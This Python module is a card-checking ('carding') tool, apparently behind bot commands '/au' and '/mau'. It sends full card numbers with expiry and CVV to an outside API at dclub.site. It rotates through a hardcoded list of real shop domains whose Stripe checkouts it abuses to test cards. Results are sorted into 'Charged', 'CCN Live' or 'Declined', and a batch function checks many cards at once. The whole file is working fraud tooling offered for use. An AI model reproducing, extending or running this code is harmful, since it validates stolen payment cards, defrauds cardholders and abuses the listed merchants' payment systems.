"""
Stripe Auth API Handler
=======================
Uses ONLY the external API for all /au and /mau card checks.
API: https://dclub.site/apis/stripe/auth/st7.php?site={site}&cc={card}

Features:
- Site rotation on errors
- Robust response parsing
- Accurate CCN/Live detection
"""

import httpx
import asyncio
import random
import re
import json
from typing import Dict, Optional, Tuple, List

# ==================== API CONFIGURATION ====================
# This is the ONLY API used for /au and /mau commands
API_URL = "https://dclub.site/apis/stripe/auth/st7.php"

# Working sites for Stripe Auth - rotated on errors
STRIPE_AUTH_SITES = [
    # Primary sites
    "havilahcastle.com",
    "shop-caymans.com",
    "shop.conequipmentparts.com",
    "sababa-shop.com",
    "mjuniqueclosets.com",
    "dutchwaregear.com",
    "nielladiverse.com",
    "grabpick.com",
    "dominileather.com",
    "theneomag.com",
    "bdmanja.com",
    "shop.littlefeetdenver.com",
    "zoe-hermsen.com",
    "saadaintl.com",
    "sockbox.com",
    "exquisitebeds.com",
    "girlslivingwell.com",
    "shop.wattlogic.com",
    "clinetix-xvps.temp-dns.com",
    "courtneyreckord.com",
    "beatrizpalacios.com",
    "peeteescollection.com",
    "2poundstreet.com",
    "prettyplainpaper.com",
    "lolaandveranda.com",
]

# Maximum retries with different sites
MAX_RETRIES = 5
REQUEST_TIMEOUT = 60

# Response patterns for accurate classification
CHARGED_PATTERNS = [
    "CHARGED", "SUCCESS", "SUCCEEDED", "ORDER_PLACED", "THANK_YOU",
    "PAYMENT_SUCCESSFUL", "PAYMENT_COMPLETE", "ORDER_COMPLETE",
    "PURCHASE_COMPLETE", "TRANSACTION_APPROVED"
]

CCN_LIVE_PATTERNS = [
    "APPROVED", "LIVE", "CCN", "3DS", "3D_SECURE", "AUTHENTICATION",
    "INCORRECT_CVC", "INVALID_CVC", "SECURITY_CODE", "CVV_CHECK",
    "INCORRECT_ZIP", "ZIP_CHECK", "ADDRESS_CHECK", "AVS",
    "INSUFFICIENT_FUNDS", "CARD_VELOCITY", "DO_NOT_HONOR",
    "CVC_CHECK_FAILED", "AVS_CHECK_FAILED", "RISK_LEVEL",
    "REQUIRES_AUTHENTICATION", "AUTHENTICATION_REQUIRED"
]

DECLINED_PATTERNS = [
    "DECLINED", "DECLINE", "REJECTED", "INVALID_NUMBER", "EXPIRED",
    "LOST_CARD", "STOLEN_CARD", "FRAUD", "RESTRICTED", "REVOKED",
    "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED", "PICKUP_CARD",
    "GENERIC_DECLINE", "CALL_ISSUER", "ISSUER_UNAVAILABLE",
    "TRY_AGAIN", "PROCESSING_ERROR", "CARD_DECLINED",
    "INVALID_EXPIRY", "INVALID_CARD", "CURRENCY_NOT_SUPPORTED"
]

ERROR_PATTERNS = [
    "ERROR", "TIMEOUT", "CONNECTION", "CAPTCHA", "BLOCKED", "RATE",
    "RATE_LIMIT", "TOO_MANY", "UNAVAILABLE", "MAINTENANCE",
    "NETWORK_ERROR", "REQUEST_FAILED", "API_ERROR"
]


def get_random_site() -> str:
    """Get a random site from the list."""
    return random.choice(STRIPE_AUTH_SITES)


def parse_api_response(response_text: str) -> Dict:
    """
    Parse API response with robust error handling.
    Supports both JSON and text-based responses.
    """
    result = {
        "response": "UNKNOWN",
        "status": "Error",
        "message": "Unknown response",
        "success": False,
        "raw_response": response_text[:500] if response_text else ""
    }
    
    if not response_text:
        result["message"] = "Empty response"
        return result
    
    # Try JSON parsing first
    try:
        import json
        data = json.loads(response_text)
        
        # Handle various API response formats
        # Format 1: {"response": "...", "status": "...", "message": "..."}
        if isinstance(data, dict):
            result["response"] = str(data.get("response", data.get("Response", data.get("result", "UNKNOWN"))))
            result["status"] = str(data.get("status", data.get("Status", "Unknown")))
            result["message"] = str(data.get("message", data.get("Message", data.get("msg", "Unknown"))))
            
            # Also check for nested structures
            if "data" in data and isinstance(data["data"], dict):
                nested = data["data"]
                result["response"] = str(nested.get("response", result["response"]))
                result["message"] = str(nested.get("message", result["message"]))
            
            # Check for error field
            if "error" in data:
                error = data["error"]
                if isinstance(error, dict):
                    result["message"] = str(error.get("message", error.get("msg", str(error))))
                    result["response"] = str(error.get("code", error.get("type", "ERROR")))
                else:
                    result["message"] = str(error)
                    result["response"] = "ERROR"
            
            return result
            
    except (json.JSONDecodeError, ValueError):
        pass
    
    # Try to parse text-based responses
    text = response_text.strip()
    
    # Check for common response patterns in raw text
    text_upper = text.upper()
    
    # Extract response from common patterns
    patterns = [
        r'(?:response|result|status)[:\s]*["\']?([A-Z_]+)["\']?',
        r'(?:message)[:\s]*["\']?([^"\']+)["\']?',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            result["response"] = match.group(1).upper()
            break
    
    # If still unknown, use the raw text as response
    if result["response"] == "UNKNOWN" and len(text) < 100:
        result["response"] = text.upper().replace(" ", "_")[:50]
    
    result["message"] = text[:200] if text else "Unknown"
    
    return result


def classify_response(result: Dict) -> Tuple[str, str, bool]:
    """
    Accurately classify the API response.
    
    Returns:
        Tuple of (status_text, header, is_live)
    """
    response = str(result.get("response", "")).upper()
    status = str(result.get("status", "")).upper()
    message = str(result.get("message", "")).upper()
    raw = str(result.get("raw_response", "")).upper()
    
    # Combine all fields for comprehensive pattern matching
    combined = f"{response} {status} {message} {raw}"
    
    # Priority 1: Check for Charged/Success (highest priority)
    for pattern in CHARGED_PATTERNS:
        if pattern in combined:
            return "Charged 💎", "CHARGED", True
    
    # Priority 2: Check for CCN/Live (CVV/AVS issues = card is valid)
    for pattern in CCN_LIVE_PATTERNS:
        if pattern in combined:
            # Specific status text based on the pattern found
            if "INCORRECT_CVC" in combined or "INVALID_CVC" in combined or "CVC" in combined:
                return "CCN Live ✅ (CVC)", "CCN LIVE", True
            elif "INCORRECT_ZIP" in combined or "AVS" in combined:
                return "CCN Live ✅ (AVS)", "CCN LIVE", True
            elif "INSUFFICIENT" in combined:
                return "CCN Live ✅ (NSF)", "CCN LIVE", True
            elif "3DS" in combined or "AUTHENTICATION" in combined:
                return "CCN Live ✅ (3DS)", "CCN LIVE", True
            elif "DO_NOT_HONOR" in combined:
                return "CCN Live ✅ (DNH)", "CCN LIVE", True
            else:
                return "Approved ✅", "CCN LIVE", True
    
    # Priority 3: Check for Errors (should retry)
    for pattern in ERROR_PATTERNS:
        if pattern in combined:
            return "Error ⚠️", "ERROR", False
    
    # Priority 4: Check for Declined
    for pattern in DECLINED_PATTERNS:
        if pattern in combined:
            # Specific decline reasons
            if "EXPIRED" in combined:
                return "Declined ❌ (Expired)", "DECLINED", False
            elif "LOST" in combined or "STOLEN" in combined:
                return "Declined ❌ (Lost/Stolen)", "DECLINED", False
            elif "FRAUD" in combined:
                return "Declined ❌ (Fraud)", "DECLINED", False
            elif "INVALID_NUMBER" in combined:
                return "Declined ❌ (Invalid)", "DECLINED", False
            else:
                return "Declined ❌", "DECLINED", False
    
    # Default: Unknown response treated as declined
    return "Unknown ❓", "UNKNOWN", False


async def check_stripe_auth(card: str, site: Optional[str] = None) -> Dict:
    """
    Check a card using the Stripe Auth API.
    
    API Format: https://dclub.site/apis/stripe/auth/st7.php?site={site}&cc={card}
    
    Args:
        card: Card in format cc|mm|yy|cvv
        site: Optional specific site to use (defaults to random from STRIPE_AUTH_SITES)
        
    Returns:
        Dict with keys: response, status, message, success, site, header, status_text
    """
    result = {
        "response": "UNKNOWN",
        "status": "Error",
        "message": "Unknown error",
        "success": False,
        "site": None,
        "raw_response": "",
        "header": "UNKNOWN",
        "status_text": "Unknown ❓"
    }
    
    # Use provided site or get random one
    if not site:
        site = get_random_site()
    
    result["site"] = site
    
    try:
        # Build API URL - THIS IS THE ONLY API USED
        api_url = f"{API_URL}?site={site}&cc={card}"
        
        # Make request to external API
        async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT, follow_redirects=True) as client:
            response = await client.get(api_url)
        
        # Check HTTP status
        if response.status_code != 200:
            result["message"] = f"HTTP {response.status_code}"
            result["response"] = f"HTTP_{response.status_code}"
            result["header"] = "ERROR"
            result["status_text"] = "Error ⚠️"
            return result
        
        # Get and store raw response
        response_text = response.text.strip()
        result["raw_response"] = response_text[:500]
        
        # Parse the API response
        parsed = parse_api_response(response_text)
        
        result["response"] = parsed["response"]
        result["status"] = parsed["status"]
        result["message"] = parsed["message"]
        
        # Classify the response for display
        status_text, header, is_live = classify_response(result)
        result["success"] = is_live
        result["status_text"] = status_text
        result["header"] = header
        
        return result
        
    except httpx.TimeoutException:
        result["message"] = "Request Timeout"
        result["response"] = "TIMEOUT"
        result["header"] = "ERROR"
        result["status_text"] = "Error ⚠️ (Timeout)"
        return result
    except httpx.ConnectError:
        result["message"] = "Connection Error"
        result["response"] = "CONNECTION_ERROR"
        result["header"] = "ERROR"
        result["status_text"] = "Error ⚠️ (Connection)"
        return result
    except Exception as e:
        result["message"] = f"Error: {str(e)[:40]}"
        result["response"] = "EXCEPTION"
        result["header"] = "ERROR"
        result["status_text"] = "Error ⚠️"
        return result


async def check_stripe_auth_with_retry(card: str, max_retries: int = MAX_RETRIES) -> Tuple[Dict, int]:
    """
    Check a card with site rotation on errors.
    
    Uses the external API: https://dclub.site/apis/stripe/auth/st7.php
    Rotates through different sites if no valid response is received.
    
    Args:
        card: Card in format cc|mm|yy|cvv
        max_retries: Maximum number of site rotations
        
    Returns:
        Tuple of (result_dict, retry_count)
    """
    tried_sites = set()
    retry_count = 0
    last_result = None
    
    while retry_count <= max_retries:
        # Get a site we haven't tried yet
        available_sites = [s for s in STRIPE_AUTH_SITES if s not in tried_sites]
        
        # If all sites tried, reset and continue
        if not available_sites:
            tried_sites.clear()
            available_sites = STRIPE_AUTH_SITES
        
        # Pick random site
        site = random.choice(available_sites)
        tried_sites.add(site)
        
        # Call the API
        result = await check_stripe_auth(card, site)
        last_result = result
        
        # Get the header (CCN LIVE, DECLINED, ERROR, UNKNOWN)
        header = result.get("header", "UNKNOWN")
        
        # If we got a REAL response (live or declined), return immediately
        if header in ["CCN LIVE", "CHARGED", "DECLINED"]:
            return result, retry_count
        
        # Check if we should retry (only on errors/unknown)
        if header in ["ERROR", "UNKNOWN"]:
            retry_count += 1
            
            if retry_count <= max_retries:
                # Wait before trying another site
                await asyncio.sleep(0.5 + random.uniform(0, 0.5))
                continue
        
        # For any other response, return as-is
        return result, retry_count
    
    # All retries exhausted
    if last_result:
        last_result["message"] = f"All {max_retries} sites tried - {last_result.get('message', 'No valid response')}"
    
    return last_result or {
        "response": "MAX_RETRIES",
        "status": "Error",
        "message": f"All {max_retries} sites failed",
        "success": False,
        "site": None,
        "header": "ERROR",
        "status_text": "Error ⚠️"
    }, retry_count


def determine_status(result: Dict) -> Tuple[str, str, bool]:
    """
    Determine status from API result.
    Wrapper function for backward compatibility.
    
    Returns:
        Tuple of (status_text, header, is_live)
    """
    return classify_response(result)


# Utility function for batch checking
async def check_cards_batch(cards: List[str], concurrency: int = 3) -> List[Tuple[str, Dict, int]]:
    """
    Check multiple cards with controlled concurrency.
    
    Args:
        cards: List of cards in format cc|mm|yy|cvv
        concurrency: Maximum concurrent checks
        
    Returns:
        List of tuples (card, result, retry_count)
    """
    semaphore = asyncio.Semaphore(concurrency)
    
    async def check_with_semaphore(card: str):
        async with semaphore:
            result, retries = await check_stripe_auth_with_retry(card)
            return (card, result, retries)
    
    tasks = [check_with_semaphore(card) for card in cards]
    return await asyncio.gather(*tasks)
